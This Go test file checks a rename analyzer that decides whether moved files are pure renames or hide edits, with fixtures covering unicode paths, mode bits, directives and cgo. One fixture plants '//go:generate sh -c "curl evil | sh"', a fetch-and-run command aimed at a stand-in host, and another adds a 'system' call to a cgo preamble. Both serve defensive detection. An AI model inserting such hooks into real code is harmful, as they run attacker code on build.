package movepurity

import (
	"testing"

	"github.com/0b1-PulsarTech/pulsarules_codex/internal/analyzer/core"
)

type renameCase struct {
	name        string
	head        map[string]string
	staged      map[string]string
	modes       map[string]string
	renames     []core.Rename
	want        bool
	wantVerdict verdict
}

func runRenameCases(t *testing.T, testCases []renameCase) {
	t.Helper()
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			repo := newFakeRepo(testCase.head, testCase.staged)
			repo.stagedModes = testCase.modes
			moves := newMoveContext(repo, testCase.renames)
			if got := moves.renameVerdict(
				testCase.renames[0],
			) == verdictPure; got != testCase.want {
				t.Fatalf("renameVerdict() pure = %v, want %v", got, testCase.want)
			}
		})
	}
}

const (
	utilA    = "internal/util/a.go"
	routingA = "internal/routing/a.go"
	utilPkg  = "example.com/m/internal/util"
)

func TestIsPureRename_Gate(t *testing.T) {
	t.Parallel()

	oldYAML, newYAML := "name: a\nport: 80\n", "name: a\nport: 6666\n"
	moveA := []core.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name:    "identical blob moves under a quoted-path-prone name",
			head:    map[string]string{"conf/\u00e9.yaml": "x: 1\n"},
			staged:  map[string]string{"deploy/\u00e9.yaml": "x: 1\n"},
			renames: []core.Rename{pair("conf/\u00e9.yaml", "deploy/\u00e9.yaml")},
			want:    true,
		},
		{
			name:    "edit to a unicode-named file",
			head:    map[string]string{"conf/\u00e9.yaml": "x: 1\ny: 2\n"},
			staged:  map[string]string{"deploy/\u00e9.yaml": "x: 1\ny: 2\nz: 4\n"},
			renames: []core.Rename{pair("conf/\u00e9.yaml", "deploy/\u00e9.yaml")},
		},
		{
			name:    "color setting does not hide an edit",
			head:    map[string]string{"conf/a.yaml": oldYAML},
			staged:  map[string]string{"deploy/a.yaml": newYAML},
			renames: []core.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name:    "external diff setting does not hide an edit",
			head:    map[string]string{"conf/a.yaml": oldYAML},
			staged:  map[string]string{"deploy/a.yaml": newYAML},
			renames: []core.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name: "textconv attribute does not hide an edit",
			head: map[string]string{
				".gitattributes": "*.yaml diff=strip\n",
				"conf/a.yaml":    oldYAML,
			},
			staged: map[string]string{
				".gitattributes": "*.yaml diff=strip\n",
				"deploy/a.yaml":  newYAML,
			},
			renames: []core.Rename{pair("conf/a.yaml", "deploy/a.yaml")},
		},
		{
			name:    "mode change on a moved Go file",
			head:    map[string]string{utilA: "package util\n"},
			staged:  map[string]string{routingA: "package routing\n"},
			modes:   map[string]string{routingA: "100755"},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_Gate_NonGoAndModes(t *testing.T) {
	t.Parallel()

	moveA := []core.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name:    "mode change on an identical non-Go blob",
			head:    map[string]string{"a.sh": "echo\n"},
			staged:  map[string]string{"b.sh": "echo\n"},
			modes:   map[string]string{"b.sh": "100755"},
			renames: []core.Rename{pair("a.sh", "b.sh")},
		},
		{
			name:    "missing staged side",
			head:    map[string]string{utilA: "package util\n"},
			staged:  map[string]string{},
			renames: moveA,
		},
		{
			name: "moved file that fails to parse",
			head: map[string]string{utilA: "package util\n\nfunc Helper() int { return 1 }\n"},
			staged: map[string]string{
				routingA: "package routing\n\nfunc util.Helper() int { return 1 }\n",
			},
			renames: moveA,
		},
		{
			name: "import declared after a function",
			head: map[string]string{utilA: "package util\n\nfunc F() {}\n\nimport \"os\"\n"},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F() {}\n\nimport \"os\"\n",
			},
			renames: moveA,
		},
		{
			name:    "body edit",
			head:    map[string]string{utilA: "package util\n\nfunc F() int { return 1 }\n"},
			staged:  map[string]string{routingA: "package routing\n\nfunc F() int { return 2 }\n"},
			renames: moveA,
		},
		{
			name:    "non-Go edit",
			head:    map[string]string{"a.txt": "x\n"},
			staged:  map[string]string{"b.txt": "y\n"},
			renames: []core.Rename{pair("a.txt", "b.txt")},
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_PackageAndDoc(t *testing.T) {
	t.Parallel()

	moveA := []core.Rename{pair(utilA, routingA)}
	oldHead := "package util\n\nfunc F() int { return 1 }\n"
	testCases := []renameCase{
		{
			name:    "package clause only",
			head:    map[string]string{utilA: oldHead},
			staged:  map[string]string{routingA: "package routing\n\nfunc F() int { return 1 }\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "reformatting keeps the token stream",
			head: map[string]string{
				utilA: "package util\n\nfunc F(a, b int) int { return a + b }\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F(a, b int) int {\n\treturn a +\n\t\tb\n}\n",
			},
			renames: moveA,
			want:    true,
		},
		{
			name:    "doc word Package old becomes Package new",
			head:    map[string]string{utilA: "// Package util does x.\npackage util\n"},
			staged:  map[string]string{routingA: "// Package routing does x.\npackage routing\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "doc word followed by more identifier is not the word",
			head: map[string]string{utilA: "// Package utility does x.\npackage util\n"},
			staged: map[string]string{
				routingA: "// Package routingity does x.\npackage routing\n",
			},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_Directives(t *testing.T) {
	t.Parallel()

	moveA := []core.Rename{pair(utilA, routingA)}
	oldHead := "package util\n\nfunc F() int { return 1 }\n"
	testCases := []renameCase{
		{
			name:    "doc comment prose edit",
			head:    map[string]string{utilA: "// Package util does x.\npackage util\n"},
			staged:  map[string]string{routingA: "// Package routing does y.\npackage routing\n"},
			renames: moveA,
		},
		{
			name: "import comment dropped with the clause",
			head: map[string]string{
				utilA: "package util // import \"example.com/m/internal/util\"\n",
			},
			staged:  map[string]string{routingA: "package routing\n"},
			renames: moveA,
			want:    true,
		},
		{
			name: "doc comment claim changed",
			head: map[string]string{
				utilA: oldHead + "\n// Sum is safe for concurrent use.\nfunc G() {}\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nfunc F() int { return 1 }\n\n// Sum is NOT safe.\n" +
					"func G() {}\n",
			},
			renames: moveA,
		},
		{
			name: "build constraint changed",
			head: map[string]string{utilA: "//go:build linux\n\n" + oldHead},
			staged: map[string]string{
				routingA: "//go:build ignore\n\npackage routing\n\nfunc F() int { return 1 }\n",
			},
			renames: moveA,
		},
	}
	runRenameCases(t, testCases)
}

func TestIsPureRename_PackageAndComments_Cgo(t *testing.T) {
	t.Parallel()

	moveA := []core.Rename{pair(utilA, routingA)}
	testCases := []renameCase{
		{
			name: "embed pattern changed",
			head: map[string]string{
				utilA: "package util\n\nimport _ \"embed\"\n\n//go:embed public.txt\n" +
					"var data string\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nimport _ \"embed\"\n\n//go:embed secret.txt\n" +
					"var data string\n",
			},
			renames: moveA,
		},
		{
			name: "linkname and generate directives added",
			head: map[string]string{
				utilA: "package util\n\nimport _ \"unsafe\"\n\nfunc now() int64\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\nimport _ \"unsafe\"\n\n" +
					"//go:linkname now runtime.nanotime\n" +
					"//go:generate sh -c \"curl evil | sh\"\nfunc now() int64\n",
			},
			renames: moveA,
		},
		{
			name: "cgo preamble edited",
			head: map[string]string{
				utilA: "package util\n\n// static int f(void) { return 1; }\nimport \"C\"\n",
			},
			staged: map[string]string{
				routingA: "package routing\n\n// static int f(void) { system(1); return 1; }\n" +
					"import \"C\"\n",
			},
			renames: moveA,
		},
		{
			name: "cgo preamble untouched by a same-directory rename",
			head: map[string]string{
				utilA: "package util\n\n// static int f(void) { return 1; }\nimport \"C\"\n",
			},
			staged: map[string]string{
				"internal/util/b.go": "package util\n\n// static int f(void) { return 1; }\n" +
					"import \"C\"\n",
			},
			renames: []core.Rename{pair(utilA, "internal/util/b.go")},
			want:    true,
		},
	}
	runRenameCases(t, testCases)
}
